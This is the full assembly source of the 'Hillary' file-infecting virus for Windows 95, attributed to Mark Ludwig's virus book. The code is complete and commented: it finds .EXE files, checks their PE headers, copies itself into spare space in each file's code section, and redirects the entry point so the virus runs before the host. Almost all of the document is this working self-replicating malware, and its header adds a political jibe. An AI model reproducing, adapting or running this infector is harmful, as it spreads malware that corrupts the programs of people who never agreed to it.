;The Hillary Virus!! This is a very simple virus that operates in
;the 32-bit Windows/Windows-95 environment. It is described and explained
;in detail in the book "The Giant Black Book of Computer Viruses" by Mark Ludwig.
;This virus is (C) 1996,8 by American Eagle Publications, Inc. Copying it
;and executing it is strictly limited by the license agreement in that book.
;Violations will be vigorously prosecuted.

;This virus is named in honor of our shadow president.

.386
locals
jumps
.model flat,STDCALL

;*****************************************************************************
;*****************************************************************************
;The host for the virus loader starts here. This program assembles to look
;exactly what an infection would look like if it were dynamically performed.

INCLUDE HOST2.INC

;*****************************************************************************
;*****************************************************************************
; The Hillary Virus starts here.

;Definitions for the virus
MAX_PATH        EQU     255H            ;maximum path length in Win 95/NT
OPEN_EXISTING   EQU     3               ;flag for CreateFile to open existing file
GENERIC_READ    EQU     80000000H       ;flags for CreateFile
GENERIC_WRITE   EQU     40000000H
FATTR_NORMAL    EQU     0               ;normal file attribute for CreateFile

PE_SIZE         EQU     248             ;size of PE file header
SEC_SIZE        EQU     40              ;size of a section header

;Stack frame definitions:
SRCH_HANDLE     EQU     0               ;handle for file search functions
TEMP            EQU     SRCH_HANDLE+4   ;temporary storage location
FHANDLE         EQU     TEMP+4          ;handle for file open/read/write/close
IOBYTES         EQU     FHANDLE+4
FIND_DATA       EQU     IOBYTES+4       ;file search data structure
;typedef struct _WIN32_FIND_DATA {
;   DWORD dwFileAttributes;
;   FILETIME ftCreationTime;            ;DD ?,?
;   FILETIME ftLastAccessTime;          ;DD ?,?
;   FILETIME ftLastWriteTime;           ;DD ?,?
;   DWORD nFileSizeHigh;
;   DWORD nFileSizeLow;
;   DWORD dwReserved0;
;   DWORD dwReserved1;
;   CHAR cFileName[MAX_PATH];
;   CHAR cAlternateFileName[ 14 ];
;} WIN32_FIND_DATA
FILEBUF         EQU     FIND_DATA+11*4+14+MAX_PATH
WORKSP          EQU     FILEBUF+1024

;The virus code itself starts right here. Control is passed here when the
;program starts up. This is the main control routine, which performs the
;infection and then passes control to the host

VIRUS:  call    RELOC
RELOC:  pop     edi                     ;edi contains relocation address for virus
        sub     edi,OFFSET RELOC
        push    ebp
        sub     esp,WORKSP              ;set up temporary data area on stack
        mov     ebp,esp
        lea     eax,[ebp+FIND_DATA]     ;perform FindFirst function
        push    eax
        lea     eax,[edi+OFFSET EXE_FILE]
        push    eax
        call    DWORD PTR [edi+FIND_FIRST_FILE]
        mov     [ebp+SRCH_HANDLE],eax
        cmp     eax,-1                  ;check for invalid handle
        jz      EXIT                    ;no more files to infect, exit to host
INFECT: call    INFECT_FILE             ;infect the file we've found
        lea     eax,[ebp+FIND_DATA]     ;now perform FindNext function
        push    eax
        mov     eax,[ebp+SRCH_HANDLE]
        push    eax
        call    DWORD PTR [edi+FIND_NEXT_FILE]
        or      eax,eax
        jnz     INFECT
EXIT:   add     esp,WORKSP
        pop     ebp                     ;get rid of temporary data area
HADDR:  jmp     HOST                    ;this address is dynamically modified by the virus

;This routine infects the file found by FIND_FIRST_EXE and FIND_NEXT_EXE, if
;it can. First it must check to see if the file is infectable. To be infectable,
;the file must (a) be a 32-bit Portable Executable, and (b) the .text section
;of the file where the code is must contain enough space to put the virus in.
;This approach automatically checks for double-infection, since the virus
;consumes enough space in the .text section that it will never infect itself.
INFECT_FILE:
        xor     eax,eax                 ;we need to push a bunch of 0 dwords
        push    eax                     ;and this is most efficient here
        push    eax                     ;FATTR_NORMAL
        push    LARGE OPEN_EXISTING
        push    eax
        push    eax
        push    LARGE GENERIC_READ or GENERIC_WRITE
        lea     eax,[ebp+FIND_DATA+44]  ;file name from search structure
        push    eax
        call    DWORD PTR [edi+CREATE_FILE]
        cmp     eax,-1                  ;was file opened successfully?
        jne     _IF1                    ;yes, continue
        ret                             ;else just exit

_IF1:   mov     [ebp+FHANDLE],eax       ;save handle here
        mov     esi,FILEBUF             ;set up for the following

        xor     ecx,ecx                 ;read 1024 bytes
        mov     ch,4                    ;same as mov ecx,1024, 1 less byte
        lea     edx,[ebp+esi]           ;into this buffer
        call    FILE_READ               ;read file header information
        jz      IFEX                    ;exit on error

        cmp     BYTE PTR [ebp+esi+18H],40H  ;valid extended header?
        jc      IFEX
        mov     ax,[ebp+esi+3CH]        ;now find the PE header
        cwde                            ;eax = offset into header where PE header starts
        add     esi,eax
        mov     eax,[ebp+esi]           ;eax = PE header signature
        cmp     ax,'EP'                 ;proper PE header?
        jne     IFEX                    ;nope, don't attempt to infect

        test    BYTE PTR [ebp+esi+PE_SIZE+36],20H;is 1st entry in section table executable code?
        jz      IFEX                    ;nope, don't attempt to infect

        mov     eax,[ebp+esi+PE_SIZE+10H]       ;get SizeOfRawData
        sub     eax,[ebp+esi+PE_SIZE+8]         ;subtract VirtualSize
        cmp     ax,VIR_SIZE and 0FFFFH          ;use ax here since should always be <64K
        jnc     _IF3                            ;enough room, go ahead with infect

IFEX:   push    DWORD PTR [ebp+FHANDLE]         ;exit INFECT_FILE routine
        call    DWORD PTR [edi+CLOSE_HANDLE]    ;close the file
        ret                                     ;and return to caller

;If we get here, we have a valid 32-bit file with a PE header, and there's
;enough room for the virus. The infection process may begin.

_IF3:   lea     ebx,[ebp+PE_SIZE]
        mov     eax,[ebx+esi+14H]       ;eax=pointer to start of .text code segment
        add     eax,[ebx+esi+8]         ;eax points to end of code in file
        lea     edx,[edi+OFFSET VIRUS]  ;buffer to write from
        mov     ecx,VIR_SIZE            ;bytes to write to file
        push    ecx                     ;save these for later
        push    ebx
        call    SEEK_WRITE              ;go ahead and write virus body to file
        pop     ebx
        pop     ecx

;Now the virus body has been written to the file. Let's modify the PE header
;so the virus will get control when the program starts.

        mov     eax,[ebx+esi+8]         ;get virtual code size
        add     ecx,eax                 ;add virus size to it
        mov     [ebx+esi+8],ecx         ;ok, virtual code size adjusted

        add     eax,[ebp+esi+44]        ;add code base, to get entry point value
        mov     ecx,eax                 ;save new entry point here
        xchg    eax,[ebp+esi+40]        ;set entry point, get old entry pt in eax
        sub     eax,ecx                 ;eax=old entry pt - new entry pt
        sub     eax,OFFSET HADDR+5 - OFFSET VIRUS
        mov     [ebp+TEMP],eax          ;save jump to host constant here

        mov     eax,esi
        sub     eax,FILEBUF             ;eax = offset of PE header in file
        mov     ecx,PE_SIZE+SEC_SIZE    ;amount to write
        lea     edx,[ebp+esi]           ;address to write from
        push    ebx
        call    SEEK_WRITE              ;update PE header
        pop     ebx

        mov     eax,[ebp+esi+40]        ;get new entry point
        add     eax,OFFSET HADDR+1 - OFFSET VIRUS       ;point to HADDR+1
        sub     eax,[ebp+esi+44]        ;subtract code base
        add     eax,[ebx+esi+20]        ;add raw data offset
        xor     ecx,ecx                 ;now adjust jump address in host
        mov     cl,4
        lea     edx,[ebp+TEMP]

;        call    SEEK_WRITE             ;instead of these two instructions
;        jmp     IFEX
        lea     ebx,[edi+OFFSET IFEX]   ;use these, they do the same thing
        push    ebx                     ;with three less bytes!

;This routine sets the file pointer to the absolute location eax from the start
;of the file. It operates on the file with handle FHANDLE. When done, it falls
;through to FILE_WRITE.
SEEK_WRITE:
        push    ecx                     ;Start with the seek, or set file ptr
        push    edx                     ;save these for the write
        push    LARGE 0                 ;FILE_BEGIN move method
        push    LARGE 0                 ;High DWORD of location is 0
        push    eax                     ;Low DWORD of location to move to
        push    DWORD PTR [ebp+FHANDLE] ;handle
        call    DWORD PTR [edi+SET_FILE_PTR]
        pop     edx
        pop     ecx

;This routine writes ecx bytes to the file whose handle is in FHANDLE.
;The data is written from the buffer pointed to by edx.
FILE_WRITE:
        lea     eax,[edi+4]     ;WRITE_FILE must follow READ_FILE!!!
        jmp     FR1             ;or this won't work

;This routine reads ecx bytes from the file whose handle is in FHANDLE.
;The data is put in the buffer pointed to by edx.
FILE_READ:
        mov     eax,edi
FR1:    mov     ebx,OFFSET READ_FILE
        add     ebx,eax
        push    LARGE 0         ;overlapping data structure (irrelevant)
        lea     eax,[ebp+IOBYTES]
        push    eax             ;address of bytes read
        push    ecx             ;bytes to read
        push    edx             ;buffer to read data into
        push    DWORD PTR [ebp+FHANDLE]   ;file handle
        call    DWORD PTR [ebx]
        or      eax,eax         ;set z if read failed
        ret

                DB      'HILLARY'      ;identity of this virus

;The folowing defines locate the API calls which the virus uses in 32-bit
;memory. The assigned values are the actual addresses of these routines in
;memory in the first general release of Windows 95. They are determined
;experimentally with a debugger, single stepping through ordinary calls.
;THE FOLLOWING VALUES ARE VALID FOR WINDOWS 95 VERSION 4.00.1111
FIND_FIRST      EQU     0BFF77A18H      ;@FindFirstFileA
FIND_NEXT       EQU     0BFF77A50H      ;@FindNextFileA
CREATE          EQU     0BFF7799CH      ;@CreateFileA
CLOSE_FILE      EQU     0BFF7BC8BH      ;@CloseHandle
SET_FP          EQU     0BFF770E4H      ;@SetFilePointer
READFILE        EQU     0BFF7594AH      ;@ReadFile
WRITEFILE       EQU     0BFF75951H      ;@WriteFile

;THE FOLLOWING VALUES ARE VALID FOR WINDOWS 95 VERSION 4.00.950
;(Uncomment them to use)
;FIND_FIRST      EQU     0BFF77893H      ;@FindFirstFileA
;FIND_NEXT       EQU     0BFF778CBH      ;@FindNextFileA
;CREATE          EQU     0BFF77817H      ;@CreateFileA
;CLOSE_FILE      EQU     0BFF7BC72H      ;@CloseHandle
;SET_FP          EQU     0BFF76FA0H      ;@SetFilePointer
;READFILE        EQU     0BFF75806H      ;@ReadFile
;WRITEFILE       EQU     0BFF7580DH      ;@WriteFile

;The following are a jump table for the virus to call the Win 95 Kernel.
FIND_FIRST_FILE DD      FIND_FIRST
FIND_NEXT_FILE  DD      FIND_NEXT
CREATE_FILE     DD      CREATE
CLOSE_HANDLE    DD      CLOSE_FILE
SET_FILE_PTR    DD      SET_FP
READ_FILE       DD      READFILE
WRITE_FILE      DD      WRITEFILE

EXE_FILE        DB      '*.EXE',0

VIR_SIZE        EQU     $ - OFFSET VIRUS

        end     VIRUS
